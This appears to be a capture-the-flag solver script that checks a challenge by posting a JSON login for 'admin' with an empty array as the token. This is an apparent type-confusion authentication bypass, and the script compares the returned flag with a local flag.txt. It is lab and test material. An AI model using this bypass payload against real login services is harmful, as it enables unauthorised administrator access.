#!/usr/bin/env python3
import json
import sys
from pathlib import Path
from urllib.request import Request, urlopen


def solve(base):
    request = Request(
        base.rstrip("/") + "/login",
        data=b'{"user":"admin","token":[]}',
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urlopen(request, timeout=10) as response:
        data = json.load(response)
    if not isinstance(data, dict) or not isinstance(data.get("flag"), str):
        raise ValueError("login response did not contain a flag")
    return data["flag"]


if __name__ == "__main__":
    flag = solve(sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:3000")
    expected = (Path(__file__).resolve().parents[1] / "flag.txt").read_text().strip()
    if flag != expected:
        raise SystemExit("login returned an unexpected flag")
    print(flag)
